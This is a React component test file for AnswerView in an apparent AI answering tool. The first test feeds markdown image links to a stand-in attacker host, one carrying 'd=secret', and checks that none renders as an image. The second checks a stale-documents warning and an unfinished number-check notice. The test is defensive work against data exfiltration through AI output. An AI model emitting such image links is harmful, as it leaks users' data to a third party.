import { afterEach, describe, expect, it, vi } from "vitest";
import { cleanup, render, screen } from "@testing-library/react";
import { AnswerView } from "./answer-view";
import type { Turn, TurnAnswer } from "./thread";

afterEach(cleanup);

const answer = (text: string, extra: Partial<TurnAnswer> = {}): TurnAnswer => ({
  text, footer: "", citations: [], gaps: [], log: null, checking: false, cut: false, ...extra,
});
const turn: Turn = { id: "t", question: "Q?", style: "", started: 0, pending: false };

function show(a: TurnAnswer) {
  return render(<AnswerView turn={turn} answer={a} onOpen={vi.fn()} onFeedback={vi.fn()} />);
}

describe("AnswerView", () => {
  it("never renders an image from the answer, whatever markdown form it takes", () => {
    const text = [
      "Leak: ![x](https://evil.example/p.png?d=secret)",
      "Reference: ![y][pic] and shortcut ![pic]",
      "Nested: [![z](https://evil.example/n.png)](https://acme.example)",
      String.raw`Escaped backslash: \\![w](https://evil.example/b.png)`,
      "",
      "[pic]: https://evil.example/ref.png",
    ].join("\n");
    const { container } = show(answer(text));
    expect(container.querySelector("img")).toBeNull();
    expect(container.innerHTML).not.toContain("<img");
    // What was an image is a plain link now, as luccy shows it.
    expect(screen.getByRole("link", { name: "x" })).toHaveAttribute("href", "https://evil.example/p.png?d=secret");
    expect(screen.getByRole("link", { name: "z" })).toHaveAttribute("href", "https://evil.example/n.png");
  });

  it("shows luccy's old-documents warning and the unfinished number check", () => {
    show(answer("Hotels up to €150.", {
      stale: "⚠ These documents are 21 days old (copied 2026-09-01) — recent changes may not be reflected.",
      cut: true,
    }));
    expect(screen.getByText("⚠ These documents are 21 days old (copied 2026-09-01) — recent changes may not be reflected.")).toBeInTheDocument();
    expect(screen.getByText(/The number check didn.t finish while you waited/)).toBeInTheDocument();
  });
});
